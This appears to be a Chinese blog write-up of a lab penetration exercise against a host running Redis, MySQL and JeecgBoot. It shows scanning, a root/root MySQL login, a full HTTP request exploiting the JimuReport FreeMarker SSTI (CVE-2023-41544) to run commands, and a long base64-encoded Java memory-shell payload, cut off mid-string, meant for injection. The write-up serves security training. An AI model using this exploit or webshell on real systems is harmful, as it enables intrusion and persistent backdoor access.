<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>wuxiang月挑战one | icon'Blog</title><meta name="author" content="icon"><meta name="copyright" content="icon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="wuxian打靶记录—月挑战入口机器10.10.0.3使用多种扫描工具对其进行端口探测，指纹识别等来进行交叉验证 TscanPlus扫描：扫描结果如下：    ID Host Port Protocol Target Banner Code Title      1 10.10.0.3 22 SSH 10.10.0.3:22 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 0">
<meta property="og:type" content="article">
<meta property="og:title" content="wuxiang月挑战one">
<meta property="og:url" content="https://iconabc.github.io/posts/55d580db.html">
<meta property="og:site_name" content="icon&#39;Blog">
<meta property="og:description" content="wuxian打靶记录—月挑战入口机器10.10.0.3使用多种扫描工具对其进行端口探测，指纹识别等来进行交叉验证 TscanPlus扫描：扫描结果如下：    ID Host Port Protocol Target Banner Code Title      1 10.10.0.3 22 SSH 10.10.0.3:22 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 0">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://iconabc.github.io/img/mbc.jpg">
<meta property="article:published_time" content="2024-12-10T02:49:26.000Z">
<meta property="article:modified_time" content="2024-12-12T07:30:00.846Z">
<meta property="article:author" content="icon">
<meta property="article:tag" content="内网">
<meta property="article:tag" content="靶场">
<meta property="article:tag" content="打靶记录">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://iconabc.github.io/img/mbc.jpg"><link rel="shortcut icon" href="/img/shasha.png"><link rel="canonical" href="https://iconabc.github.io/posts/55d580db.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: icon","link":"链接: ","source":"来源: icon'Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'wuxiang月挑战one',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/mbc.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">22</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/shuai.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">icon'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">wuxiang月挑战one</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">wuxiang月挑战one</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-12-10T02:49:26.000Z" title="发表于 2024-12-10 10:49:26">2024-12-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-12T07:30:00.846Z" title="更新于 2024-12-12 15:30:00">2024-12-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wuxian%E6%89%93%E9%9D%B6%E6%9C%88%E6%8C%91%E6%88%98one/">wuxian打靶月挑战one</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">5.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>25分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="wuxian打靶记录—月挑战"><a href="#wuxian打靶记录—月挑战" class="headerlink" title="wuxian打靶记录—月挑战"></a>wuxian打靶记录—月挑战</h1><h2 id="入口机器10-10-0-3"><a href="#入口机器10-10-0-3" class="headerlink" title="入口机器10.10.0.3"></a>入口机器<strong>10.10.0.3</strong></h2><p>使用多种扫描工具对其进行端口探测，指纹识别等来进行交叉验证</p>
<p>TscanPlus扫描：扫描结果如下：</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Host</th>
<th>Port</th>
<th>Protocol</th>
<th>Target</th>
<th>Banner</th>
<th>Code</th>
<th>Title</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>10.10.0.3</td>
<td>22</td>
<td>SSH</td>
<td>10.10.0.3:22</td>
<td>OpenSSH 8.2p1 Ubuntu 4ubuntu0.11</td>
<td>0</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>10.10.0.3</td>
<td>3306</td>
<td>MYSQL</td>
<td>10.10.0.3:3306</td>
<td>MySQL 8.0.19</td>
<td>0</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>10.10.0.3</td>
<td>6379</td>
<td>REDIS</td>
<td>10.10.0.3:6379</td>
<td>Redis key-value store 5.0.14</td>
<td>0</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>10.10.0.3</td>
<td>18080</td>
<td>HTTP</td>
<td><a target="_blank" rel="noopener" href="http://10.10.0.3:18080/">http://10.10.0.3:18080</a></td>
<td>APACHE-Shiro</td>
<td>200</td>
<td>DocToolkit</td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>10.10.0.3</td>
<td>18088</td>
<td>HTTP</td>
<td><a target="_blank" rel="noopener" href="http://10.10.0.3:18088/">http://10.10.0.3:18088</a></td>
<td>Apache-Tomcat</td>
<td>404</td>
<td>HTTP Status 404 – Not Found</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>fscan扫描：结果如下</p>
<img src="/posts/55d580db/image-20241210112601373.png" class="" title="image-20241210112601373">

<p>发现了弱口令：再使用tscan爆破模块进行交叉验证</p>
<img src="/posts/55d580db/image-20241210112706816.png" class="" title="image-20241210112706816">

<p>确实存在mysql弱口令数据库暴露了出来，将初步收集到的信息进行保存</p>
<p>对http网站进行目录探测操作：</p>
<p>这里，可以利用多种爆破工具，在此出于方便，我直接利用tscanplus进行扫描</p>
<p>探测到如下一些信息：</p>
<p><code>http://10.10.0.3:18088/</code>：</p>
<img src="/posts/55d580db/image-20241210113209024.png" class="" title="image-20241210113209024">

<img src="/posts/55d580db/image-20241210113343239.png" class="" title="image-20241210113343239">

<p>可以发现一些关于：<code>jeecg-boot</code>的一些信息，在这里打个？后面再对其进行深度分析和挖掘。</p>
<p><code>http://10.10.0.3:18080/</code>：</p>
<img src="/posts/55d580db/image-20241210113633313.png" class="" title="image-20241210113633313">

<p>探测到如上目录：</p>
<img src="/posts/55d580db/image-20241210113734161.png" class="" title="image-20241210113734161">

<p>可以发现:<code>DocToolkit</code>依旧打个？后续对其进行深入研究和挖掘</p>
<hr>

<p><code>mysql</code>弱口令<code>root/root</code>直接利用navicat工具连接：</p>
<p>依旧发现了<code>jeecg-boot</code>的行踪与上面相呼应。</p>
<img src="/posts/55d580db/image-20241210112937947.png" class="">

<hr>

<h3 id="10-10-0-3-积木报表-SSTI："><a href="#10-10-0-3-积木报表-SSTI：" class="headerlink" title="10.10.0.3-积木报表 SSTI："></a>10.10.0.3-积木报表 SSTI：</h3><p><code>http://10.10.0.3:18088/jeecg-boot/</code></p>
<p>尝试查询相关历史漏洞进行利用：</p>
<p>直接利用这个One-fox里的jeecg-boot框架相关的工具对其进行漏洞探测</p>
<img src="/posts/55d580db/image-20241210142108262.png" class="" title="image-20241210142108262">

<p>直接利用内置的工具进行<code>rce</code>:</p>
<img src="/posts/55d580db/image-20241210143013940.png" class="" title="image-20241210143013940">

<p>这个是java的ssti:具体cve漏洞为：<code>CVE-2023-41544</code>手动复现如下</p>
<p>POC:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/loadTableData HTTP/1.1</span><br><span class="line">Host: 10.10.0.3:18088</span><br><span class="line">Content-Length: 165</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://10.10.0.3:18088</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://10.10.0.3:18088/jeecg-boot/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;dbSource&quot;:&quot;&quot;,&quot;sql&quot;:&quot;select &#x27;&lt;#assign value=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt;$&#123;value(\&quot;whoami\&quot;)&#125;&#x27;&quot;,&quot;tableName&quot;:&quot;test_demo);&quot;,&quot;pageNo&quot;:1,&quot;pageSize&quot;:10&#125;</span><br></pre></td></tr></table></figure>

<img src="/posts/55d580db/image-20241210155024744.png" class="" title="image-20241210155024744">

<p>尝试ssti打入内存马：</p>
<p>直接利用工具<code>java-memshell-generator</code>生成base64编码生成后的内存马：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADEBsgEAK29yZy9hcGFjaGUvY29tbW9ucy9sYW5nL2wvQ29uZmlndXJhdGlvblV0aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQANZ2V0VXJsUGF0dGVybgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAAi8qCAAIAQAMZ2V0Q2xhc3NOYW1lAQAvY29tLmZhc3RlcnhtbC5qYWNrc29uLlNlcnZsZXRSZXF1ZXN0UGp4dGRGaWx0ZXIIAAsBAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcADwEAEGphdmEvbGFuZy9TdHJpbmcHABEBCkxINHNJQUFBQUFBQUFBS1ZYQ1hzVDF4VTl6NUk5c2l4Q0VNRllRSUtURkxBczI4S0FDWllKaWVVNHdjUTJGQ1dtanRObExJMHNHWGtrTkNQSG9rdmFkRW02cDAyM2ROOUpkOUlHR1FjQ2RBc05UWnR1N3I5SnY1NDNJOG1TTEJ2NjlmdXNOL1BldSsvY2U4OWQzdmpHZjE2OUFxQVgveFlJUnROendiaHFtRnAyWVM0Vm5GV2pwNDIwSG94bzJmbVVacDdVenVRMHd6d3h1MkRHSGs2bUtLUkFDR3laVmVmVllFclZaNEpES2RVd1J0TnFURzQ1Qk82UVd3dEJ3ejRmTEIxcUZCQXpQTmd4RmZhUDFwd2VFSEFPcFdPYXdNYlJwSzZONSthbXRleGo2blNLSzk3UmRGUk5UYWpacEp3WEY1MW1JbWtJOUk3K2o3WlRrWmdXYUpnS0M3VEV0RGlWV1FZSWJLVmRJeU9yTGZQZ2RteHl3d212UU5QaHBKNDBqd2c0T3Z3VEh0eUJMWEtqVldCYlIrMDVtNDhCL3dRVlJvbSt4cjRFYVpNZzJ3VmNzYlJ0cE1DVWpiZENZclZEQTJ2dEdwbTBibWkxMnpicVVFSk42cFpCbTFkc0dWNklhaGt6bWRZVjdCUlFETTB3T0JGb3I0RkltR1ltZUpSRHhKWWdqNDcwOUt5TWx3V1dNNU9wNEppYTRmcVc0dEZvTnA4eDA4R2haQ1poODY2VjltcFVjKzgybzhvL2didlc5NTk2aldxZkJYYmVoQlFHUEw1Q2hNRDJkVmdpRmRtU0tYdldwcUxHSmxlMmJFeHQvRllmS2x1MTY1YmdGZXdUMkgxcm9Bb09DR3lJbUN3R2hxUllNZTZFSmpOdVhKMnphbW9sRGhFem05Um5tSW4zNFZBekd0QXYwRHlqbVVjdGNlcnNXQzNycjNkOEFJZGJzQi8zazJkYjFZU2F5bWtlUEdERFBpaHdlKzBwQlN4RFZ6U3RteVNkTmJpOXFvd1NhallpbmRlajJvRC9DUThld3JBYlEzaVl2dEMrU0NsVjcrbnczeXhaUFRpS0VXbmNNWUZOSy9sNlZEVVNKRWpCcUJ0amFIV2hoN1JWcGJPQ0UwejBUSTVwY0tqU3R1UFRzMXEwV0laVksvN1ZTeDZjUktRRjc4UmpMdXgxNFc1V1FzNkZkN0dIWmRnSFBIakM1bWVLU2IrK0d3cmVUYlpvakVVc0U3Tk9aT3BZeEViMVhyeXZCZStCU2w4R2h5TXVSSXM5b0taSUZSQzFoZHlPNklhcGtuWUIvNXJScnkxd0QyYVFjQ09PSkV1eFNzRElhRkZXWXpTcm1ZOXErUWhuQ2s3VEV5b0s1MDJOY1hkMitLZkNIc3hCbHdGTzI4MjRqbUtyNTU1eEl3VW1wbFAyWWlrNllrc2FXalNYVFpyNUlKVllvaVp5MHA3NXFzU3pXVkd3WUJ0UWJQNmJPK28xL3JONHZ4dDVmSURkcG1aVHdZZll0RXJuN1Y0dTRGdU5VbTd6SDhaSDNIZ2F6N2daYXZiNkhldTFOd1VmdDJ2d1pMRUd0NVdBaytsZ09CZVBhMWt0WnU4UitWazgxNEpQNEpNQ3JmVmxGSHphNmsxcVRONnR2Sjg3NnRidlovRTVOejZEejlPeFdEcXNHdHJCQXc5cFVldFNicTJYQlRKaVg4QVhwVU12c0YvS3kwdFhVN3drNVFVdk43K01yMGorditxQkFwY1VlNUhacFd0UHJXUlh0U1hsZXZrR3ZpbTUraGF4U0lpYU11UlhRNTNNWmsvNERyNHJRL1E5a3I5bU4xZndBNEVILzc4YlZlYlRuZmhSQzM2SUg3UC9sTzh1bzNTYmt2V1I0eFczNlU5V2xYTVJza0xtWndLTjBaUjY5aXk3VXAwdklpVm0wWit0YnRkRjU1bi84MnEyanhWdG1KUm9OWEo2ejF6U2lQYUVCeVBEcGNobFhmZ05jZUxwWXR2ZmRaTmVYa3I4Q3lqSUFDd0tlR3diN0lSeVljbk95ekhOVEtSalpWS3I4S1pXNFZWcXlHcnhGTTBQMmdoVWRRbVhwYXJYQk5yV2tsSndsWm1RMU9mVHArbERmNTFNbUxyRlJ2eGIvTTZOYS9pOWdvM0ZwdEFqTzMyUG5lMHV2RzVmTFdYeS9rUzlOZ0V1M0dCYnE4MmhZcEtsOVhoeXh2cXk4c1FyVmxqbDY4bGJBV2J3MG5uYTBxdjJ4cUw5dmRIK3ZmZnQzOWNYUGVqQzMyakw0enpZUFRpajZhWUwvNkQ4TVQyZVQ2UlVGLzZGdTFsUFR0QStPRGp5RHVIWHZKQlh1UFY4d0hyeVExMldIc2RtenU2bmZBT2Z6WjBCUitES0lqYWY1NlFCYm81TkZBRmJhd3ZIVmxzSUhtd0FyTGZic0pIN1FuN3VGcUdHS1NOUGJPMWM1TS83OXd0NHN0UDd6d3NJZFhxWEwyRHc1VEt3MndMYlN0QTJDOXhqSHl1Q1M4aTJJdVFKU2tyWnRzN0FJbmJjSEhNN1VYWlVHTnhXTnJnTlBteXpETDRUZDNHUDZPSXlYWlJhbGdQWHNEL2s3THFHdmxDano5bjVDa0pMT05LQTEvRlN4WXd2Z3dVODhpSmVrT0pMZUZRZzFIUUpZNU9MR0E4cFBzVjdQTENFeHgwNHhkY0pYMlA1L1pTdnFmamU1SjBreUpOTG1IYkFHN3VJMlpETDUycThoSlMxWEVER0cxdUVVY0JUbDlBdzJWbkFCd3Y0NkNJKzVuTjFFdmxUQWdVOFg4Q1hDdmhhQVY4djROcytwWUR2bnpxSGx1NUExeExPT1hBT0cwSk5wY25MZE5XRDY3aUJkaWFEcE9nWXZCeDMwdWwyN3R5TElONkJFSGJ4YnQyTmNleGh1blN3TVhmQ1FJQ1hYQmVlUnpjdW93ZFhLWG1kbjBrMytJL2htOWpITkR0Z1VSd25hZ2pQTU9udUllWVFHKzY5UkZSNE5reXlkekhGM3VSdk41R2JKTW5sVUN4VGo5OEsrVEsxQmF4QUxWTmZOKzFzd2x2VUdHUlNldkFHOWxKakl3NXlmeE9jYitPcWd2MEsrcFN3Z3ZabXZHU2xhQU4raXA4VGpIZU9IVlc4emRWR1B2UGVWeTdpNGxpWDkxWG5hM2g2MHVFZGloUndwWXZFY1o2ZmRBUTQvY00xL0xIOGQzN01lNTBueHJ1OWJ6aDRnc0tDenp5bFFrNmZrK0h3L3JrU3llZGNDOGZ5VGRwZVluNmJ4Y0FoanYxY0RaSERBYzRPWTVUbEo1azh3cDBtTXZFTC9KSk9ITUtnOWViZ2ZqZCtoZk5rWXg4ZVlVVDNXRnpseTB6bThXdEtDNHNoVnVzWjhtTFJJbHRBTzM4bUkyQ1QwbWNWQ25OK3BXTHM4ZzVYVklzb0F3djhCWC9sV0FLVERMOVZMdlNBSlZFSGJMaWluTXRnL3dVU015Y1JWUkFBQUE9PQgAEwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAFQAWCgASABcBAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAaAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAGZmlsdGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHY29udGV4dAEACGNvbnRleHRzAQAQTGphdmEvdXRpbC9MaXN0OwEABHRoaXMBAC1Mb3JnL2FwYWNoZS9jb21tb25zL2xhbmcvbC9Db25maWd1cmF0aW9uVXRpbDsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAkTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQAOamF2YS91dGlsL0xpc3QHACcBABJqYXZhL3V0aWwvSXRlcmF0b3IHACkBAA1TdGFja01hcFRhYmxlDAAVABkKAAQALAEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsMAC4ALwoAAgAwAQAIaXRlcmF0b3IBABYoKUxqYXZhL3V0aWwvSXRlcmF0b3I7DAAyADMLACgANAEAB2hhc05leHQBAAMoKVoMADYANwsAKgA4AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAA6ADsLACoAPAEACWdldEZpbHRlcgEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAA+AD8KAAIAQAEACWFkZEZpbHRlcgEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAQgBDCgACAEQBAARrZXkxAQAIY2hpbGRyZW4BABNMamF2YS91dGlsL0hhc2hNYXA7AQADa2V5AQALY2hpbGRyZW5NYXABAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHAFABABBqYXZhL2xhbmcvVGhyZWFkBwBSAQARamF2YS91dGlsL0hhc2hNYXAHAFQBABNqYXZhL3V0aWwvQXJyYXlMaXN0BwBWCgBXACwBAApnZXRUaHJlYWRzCABZAQAMaW52b2tlTWV0aG9kAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsMAFsAXAoAAgBdAQAHZ2V0TmFtZQwAXwAGCgBTAGABABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCABiAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAGQAZQoAEgBmAQAGdGFyZ2V0CABoAQAFZ2V0RlYMAGoAXAoAAgBrAQAGdGhpcyQwCABtCABHAQAGa2V5U2V0AQARKClMamF2YS91dGlsL1NldDsMAHAAcQoAVQByAQANamF2YS91dGlsL1NldAcAdAsAdQA0AQADZ2V0DAB3AD8KAFUAeAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAegB7CgAEAHwBAA9qYXZhL2xhbmcvQ2xhc3MHAH4KAH8AYAEAD1N0YW5kYXJkQ29udGV4dAgAgQEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgwAgwCECwAoAIUBABVUb21jYXRFbWJlZGRlZENvbnRleHQIAIcBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DACJAIoKAFMAiwEACHRvU3RyaW5nDACNAAYKAH8AjgEAGVBhcmFsbGVsV2ViYXBwQ2xhc3NMb2FkZXIIAJABAB9Ub21jYXRFbWJlZGRlZFdlYmFwcENsYXNzTG9hZGVyCACSAQAJcmVzb3VyY2VzCACUCAAgAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24HAJcBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYMABUAmQoAmACaAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24HAJwBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uBwCeAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgcAoAEACVNpZ25hdHVyZQEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQATamF2YS9sYW5nL1Rocm93YWJsZQcApAEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwCuAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7DACwALEKAFMAsgEADmdldENsYXNzTG9hZGVyDAC0AIoKAH8AtQwACgAGCgACALcBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DAC5ALoKAK8AuwwADQAGCgACAL0BAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCDAC/AMAKAAIAwQEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCDADDAMQKAAIAxQgAqAcApwEAEWphdmEvbGFuZy9JbnRlZ2VyBwDJAQAEVFlQRQwAywCrCQDKAMwBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAM4AzwoAfwDQAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwDSAQANc2V0QWNjZXNzaWJsZQEABChaKVYMANQA1QoA0wDWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMANgA2QoAygDaAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DADcAN0KANMA3gEAC25ld0luc3RhbmNlDADgADsKAH8A4QEADWdldEZpbHRlck5hbWUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEADGxhc3REb3RJbmRleAEAAUkBAAljbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsBAAEuCADpAQALbGFzdEluZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkMAOsA7AoAEgDtAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7DADvAPAKABIA8QEACWZpbHRlckRlZgEACWZpbHRlck1hcAEAAmUyAQAMY29uc3RydWN0b3JzAQAgW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAAxmaWx0ZXJDb25maWcBAA1maWx0ZXJDb25maWdzAQAPTGphdmEvdXRpbC9NYXA7AQAOY2F0YWxpbmFMb2FkZXIBAA9maWx0ZXJDbGFzc05hbWUBAApmaWx